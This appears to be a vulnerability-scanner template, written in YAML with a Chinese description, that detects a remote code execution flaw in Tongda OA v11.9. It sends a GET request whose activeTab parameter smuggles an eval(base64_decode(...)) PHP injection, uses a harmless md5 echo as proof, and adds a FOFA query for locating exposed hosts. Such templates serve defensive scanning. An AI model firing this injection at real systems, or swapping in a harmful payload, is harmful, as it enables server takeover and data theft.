id: tongda-getdata-rce

info:
  name: Tongda OA v11.9 getadata - 远程代码执行漏洞
  author: SleepingBag945
  severity: critical
  description: |
    该模板用于检测 Tongda OA v11.9 getadata - 远程代码执行漏洞。该类漏洞通常与危险接口暴露、命令参数拼接、模板解析、反序列化或组件缺陷有关，攻击者可能让服务端执行非预期代码。模板会向 `/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(...` 等位置发送探测请求，并结合响应状态、关键字、错误信息、时间差或外带交互等证据判断目标是否受影响。
  impact: |
    - 攻击者可在目标服务权限范围内执行命令或代码，进而接管应用所在主机。
    - 成功利用后可能泄露配置、密钥和业务数据，并为横向移动、持久化控制或破坏业务提供入口。
  remediation: |
    - 升级受影响产品或组件到厂商修复版本，移除存在已知缺陷的依赖。
    - 限制高危接口的公网访问，增加认证、授权和来源校验，并避免将用户输入传入命令执行、模板解析或反序列化流程。
    - 排查异常进程、计划任务、WebShell、外联连接和新增账号，必要时轮换凭据并重建受影响环境。
  reference:
    - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/oa/%E9%80%9A%E8%BE%BEOA/%E9%80%9A%E8%BE%BEOA%20v11.9%20getdata%20%E4%BB%BB%E6%84%8F%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E.md
  classification:
    cpe: cpe:2.3:a:tongda2000:office_anywhere:*:*:*:*:*:*:*:*
    cwe-id: CWE-78,CWE-95
  metadata:
    verified: true
    max-request: 1
    fofa-query: app="TDXK-通达OA"
    product: office_anywhere
    vendor: tongda2000
  tags: tongda,rce,vuln

variables:
  num: '999999999'
  payload: "echo md5({{num}});"

http:
  - method: GET
    path:
      - "{{BaseURL}}/general/appbuilder/web/portal/gateway/getdata?activeTab=%E5%27%19,1%3D%3Eeval(base64_decode(%22{{base64(payload)}}%22)))%3B/*&id=19&module=Carouselimage"

    matchers-condition: and
    matchers:
      - type: word
        words:
          - '{{md5(num)}}'
          - 'pagelimit'
        condition: and

      - type: status
        status:
          - 200
